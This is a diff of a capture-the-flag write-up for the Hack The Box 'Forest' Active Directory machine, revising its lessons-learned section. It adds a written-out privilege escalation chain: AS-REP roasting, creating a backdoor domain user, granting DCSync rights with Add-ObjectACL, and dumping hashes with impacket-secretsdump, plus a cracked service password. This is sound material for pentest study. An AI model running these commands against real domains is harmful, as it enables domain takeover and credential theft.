@@ -291,38 +291,25 @@ Access to Administrator account and catch the flag
 
 ![img52](/img/Pasted_image_20251224210045.png)
 
----
-
 ## Lessons Learned
 
-### Key Takeaways
+This machine provided valuable insights into Active Directory enumeration and privilege escalation through nested group memberships.
 
-This machine provided valuable insights into Active Directory enumeration and privilege escalation through nested group memberships. Here are the main lessons learned:
+### Anonymous LDAP/RPC Access
 
-### 1. **Anonymous LDAP/RPC Access is a Critical Misconfiguration**
+The ability to enumerate users without credentials was the initial foothold. Using enum4linux -a and rpcclient, we could extract the complete list of domain users without authentication.
 
-The ability to enumerate users without credentials was the initial foothold. This demonstrates why organizations should:
-- Disable anonymous binds on LDAP (set `dSHeuristics` appropriately)
-- Configure `RestrictAnonymous` registry key to value 2
-- Implement proper access controls on directory services
+This is a critical misconfiguration that still exists in many environments. Organizations should disable anonymous binds on LDAP and configure the RestrictAnonymous registry key to value 2.
 
-**Detection:** Monitor for unusual LDAP queries and RPC enumeration attempts from unauthenticated sources.
+### AS-REP Roasting
 
-### 2. **AS-REP Roasting Targets Service Accounts**
+The svc-alfresco account had the DONT_REQ_PREAUTH flag set, allowing us to obtain its TGT hash without authentication using GetNPUsers.py. The hash was easily cracked with hashcat, revealing the password s3rvice.
 
-Service accounts are prime targets for AS-REP Roasting when Kerberos pre-authentication is disabled. The `svc-alfresco` account had the `DONT_REQ_PREAUTH` flag set, allowing us to obtain its TGT hash without authentication.
+Service accounts are prime targets for this attack when Kerberos pre-authentication is disabled. 
 
-**Mitigation:**
-- Enable Kerberos pre-authentication for all accounts
-- Use strong, complex passwords for service accounts (30+ characters)
-- Implement Group Managed Service Accounts (gMSA) when possible
-- Regularly audit accounts with `DONT_REQ_PREAUTH` flag
+### Nested Group Memberships
 
-**Defense:** Deploy honeypot accounts with this flag set and monitor for AS-REP Roasting attempts.
-
-### 3. **Nested Groups Create Hidden Privilege Escalation Paths**
-
-The privilege escalation path was not immediately obvious:
+The privilege escalation path was not immediately obvious. The svc-alfresco user was member of Service Accounts, which was member of Privileged IT Accounts, which was member of Account Operators.
 ```
 svc-alfresco (user)
     └─> Service Accounts (group)
@@ -330,176 +317,78 @@ svc-alfresco (user)
             └─> Account Operators (privileged built-in group)
 ```
 
-This demonstrates the importance of:
-- Understanding **transitive group memberships**
-- Regularly auditing group nesting structures
-- Following the principle of least privilege
-- Documenting group hierarchies
+BloodHound visualizes these relationships automatically, but understanding manual enumeration is crucial for exams and restricted environments.
 
-**Tools for Discovery:**
-- **BloodHound** - Visualizes these relationships automatically
-- **Manual enumeration** - Understanding the commands is crucial for exams and restricted environments
+We could extract this information manually with the following sequence of commands:
+```powershell
+Get-ADUser svc-alfresco -Properties MemberOf | Select-Object -ExpandProperty MemberOf
 
-### 4. **Account Operators is Dangerously Powerful**
+Get-ADGroup "Service Accounts" -Properties MemberOf | Select-Object -ExpandProperty MemberOf
 
-The Account Operators group is often overlooked but provides significant privileges:
-- Create and modify user accounts
-- Modify group memberships (with some exceptions)
-- Reset passwords for non-protected accounts
+Get-ADGroup "Privileged IT Accounts" -Properties MemberOf | Select-Object -ExpandProperty MemberOf
+```
+
+### Account Operators Group
+
+The Account Operators group is often overlooked but provides significant privileges - create and modify user accounts, modify group memberships (with some exceptions), and reset passwords for non-protected accounts.
 
 Combined with knowledge of DCSync requirements, this group can lead directly to Domain Admin compromise.
 
-**Best Practice:** Avoid using built-in privileged groups for custom delegations. Create custom groups with specific, limited permissions instead.
+### DCSync Attack
 
-### 5. **DCSync Attack Fundamentals**
+The DCSync attack requires specific permissions on the domain object - DS-Replication-Get-Changes and DS-Replication-Get-Changes-All.
 
-The DCSync attack requires specific permissions on the domain object:
-- `DS-Replication-Get-Changes` (GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
-- `DS-Replication-Get-Changes-All` (GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
-- `DS-Replication-Get-Changes-In-Filtered-Set` (optional)
-
-**Attack Chain:**
-1. Obtain Account Operators (or equivalent) access
-2. Create a user and grant replication permissions
-3. Use `secretsdump.py` or `mimikatz` to perform DCSync
-4. Extract all domain password hashes, including Administrator
-
-**Detection:**
-- Monitor Event ID 4662 for replication operations from non-DC computers
-- Alert on `DS-Replication-Get-Changes` operations from unusual accounts
-- Implement honeypot credentials that trigger alerts when accessed
-
-### 6. **Manual Enumeration vs. Automated Tools**
-
-While BloodHound is incredibly powerful for visualizing attack paths, understanding manual enumeration is critical because:
-- **Exams** (OSCP, CRTP, etc.) may restrict automated tools
-- **Stealth** - Manual commands can be less noisy
-- **Understanding** - Knowing what tools do "under the hood" makes you a better pentester
-- **Troubleshooting** - When tools fail, manual methods work
-
-**Key Manual Commands:**
+The attack chain was:
 ```powershell
-# User group memberships
-Get-ADUser <user> -Properties MemberOf
+net user hacker P@ssword1 /add /domain
 
-# Nested group discovery
-Get-ADGroup <group> -Properties MemberOf
+net group "Exchange Windows Permissions" hacker /add
 
-# Recursive group enumeration
-Get-ADGroupMember <group> -Recursive
+net localgroup "Remote Management Users" hacker /add
+
+$pass = ConvertTo-SecureString 'P@ssword1' -AsPlainText -Force
+
+$cred = New-Object System.Management.Automation.PSCredential('htb\hacker',$pass)
+
+Add-ObjectACL -PrincipalIdentity hacker -Credential $cred -Rights DCSync
 ```
 
-### 7. **Exchange Windows Permissions Group**
+Then, in my kali linux:
+```bash
+impacket-secretsdump htb/hacker@10.129.45.7
+```
 
-Adding the user to "Exchange Windows Permissions" was part of the privilege escalation. This group often has WriteDacl permissions on the domain object, which can be leveraged for DCSync.
+Detection: Monitor Event ID 4662 for replication operations from non-DC computers.
 
-**Historical Context:** This was a common misconfiguration in Exchange-integrated AD environments (PrivExchange vulnerability).
+### Manual vs Automated Enumeration
 
-### 8. **Tool Proficiency: Impacket Suite**
+At this point, I decided to take a dual approach: use BloodHound for the first time to learn the tool, while also continuing with manual enumeration, which was my original methodology.
 
-This machine reinforced the importance of mastering Impacket tools:
-- `GetNPUsers.py` - AS-REP Roasting
-- `secretsdump.py` - DCSync and hash dumping
-- `psexec.py` - Remote code execution with Pass-the-Hash
+While BloodHound is powerful for visualizing attack paths, understanding manual enumeration is critical - certification exams (OSCP, CRTP) may restrict automated tools, manual commands can be less noisy, and when tools fail, manual methods still work.
 
-These tools are essential for any AD pentester's toolkit.
+### Exchange Windows Permissions
 
-### 9. **WinRM for Post-Exploitation**
+Adding the user to Exchange Windows Permissions was crucial for the privilege escalation. This group often has WriteDacl permissions on the domain object, which can be leveraged for DCSync.
 
-Port 5985 (WinRM/evil-winrm) is increasingly common and provides a PowerShell-based shell that's:
-- More stable than traditional reverse shells
-- Allows easy file uploads/downloads
-- Provides native PowerShell capabilities
-- Often allowed through firewalls for administration
+This was a common misconfiguration in Exchange-integrated AD environments.
 
-**Blue Team:** Monitor WinRM connections, especially from unusual user accounts.
+### Tool Proficiency
 
-### 10. **Documentation and Methodology**
+This machine reinforced the importance of mastering the Impacket suite:
+- GetNPUsers.py for AS-REP Roasting
+- secretsdump.py for DCSync and hash dumping  
+- psexec.py for remote code execution with Pass-the-Hash
 
-Following a structured approach paid off:
-1. **Reconnaissance** - Port scanning, service identification
-2. **Enumeration** - User discovery, LDAP queries, RPC enumeration
-3. **Initial Access** - AS-REP Roasting → credentials
-4. **Privilege Escalation** - Nested group discovery → Account Operators → DCSync
-5. **Post-Exploitation** - Administrator access, flag capture
+### WinRM Access
 
-Maintaining this methodology ensures no steps are missed and findings are reproducible.
+Port 5985 (WinRM) provided a PowerShell-based shell using evil-winrm. This is increasingly common in Windows environments and provides more stable access than traditional reverse shells.
 
----
+### Methodology
 
-## Recommendations for Blue Team
-
-Based on this attack path, defenders should:
-
-### Immediate Actions:
-1. ✅ Audit all accounts for `DONT_REQ_PREAUTH` flag
-2. ✅ Review and document nested group memberships
-3. ✅ Implement detection for DCSync attempts (Event ID 4662)
-4. ✅ Disable anonymous LDAP/RPC access
-5. ✅ Review membership in privileged groups (especially Account Operators)
-
-### Long-term Hardening:
-1. ✅ Implement tiered administration model
-2. ✅ Deploy Group Managed Service Accounts (gMSA)
-3. ✅ Regular BloodHound analysis to identify attack paths
-4. ✅ Enable Advanced Threat Analytics (ATA) or Microsoft Defender for Identity
-5. ✅ Implement Protected Users group for high-value accounts
-6. ✅ Regular password audits and enforcement of complexity requirements
-
-### Monitoring and Detection:
-1. ✅ SIEM rules for AS-REP Roasting (multiple TGT requests)
-2. ✅ Alerts for DCSync from non-DC systems
-3. ✅ Anomaly detection for unusual LDAP queries
-4. ✅ Monitor user/group creation and modification
-5. ✅ Track WinRM connections from service accounts
-
-
-
----
-## References and Further Reading 
-
-- [Microsoft: Understanding Security Groups](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups) 
-- [SpecterOps: BloodHound Documentation](https://bloodhound.specterops.io/manage-bloodhound/overview/) 
-- [Impacket GitHub Repository](https://github.com/fortra/impacket) 
-- [PayloadsAllTheThings: Active Directory Attack](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md) 
-- ---
-## Tools Used
-
-| Tool | Purpose |
-|------|---------|
-| nmap | Port scanning and service enumeration |
-| enum4linux | SMB/RPC enumeration |
-| ldapsearch | LDAP queries and user discovery |
-| GetNPUsers.py | AS-REP Roasting attack |
-| hashcat | Password hash cracking |
-| evil-winrm | Remote PowerShell access |
-| BloodHound | AD attack path visualization |
-| SharpHound | BloodHound data collection |
-| PowerView | Manual AD enumeration |
-| secretsdump.py | DCSync attack and hash extraction |
-| psexec.py | Remote code execution (Pass-the-Hash) |
-
----
-
-## Final Thoughts
-
-Forest was an excellent introduction to Active Directory enumeration and exploitation. The machine taught fundamental concepts that apply to real-world environments:
-
-- **Anonymous enumeration** is still surprisingly common
-- **Service accounts** are often misconfigured
-- **Nested groups** create hidden privilege escalation paths
-- **Built-in privileged groups** like Account Operators can be devastating
-- **DCSync** remains one of the most powerful AD attacks
-
-The combination of automated tools (BloodHound) and manual enumeration techniques provided a comprehensive understanding of the attack surface. This methodology will prove invaluable in both certification exams (OSCP, CRTP) and real penetration testing engagements.
-
-**Key Skill Developed:** Understanding the relationship between group memberships, permissions, and attack paths in Active Directory environments.
-
----
-
-**Machine Completed:** Forest  
-**Difficulty:** Easy  
-**Flags Captured:** 2/2 ✅  
-
----
+Following a structured approach:
+1. Reconnaissance - Port scanning, service identification
+2. Enumeration - User discovery, LDAP queries, RPC enumeration
+3. Initial Access - AS-REP Roasting
+4. Privilege Escalation - Nested group discovery, Account Operators, DCSync
+5. Post-Exploitation - Administrator access, flag capture
 
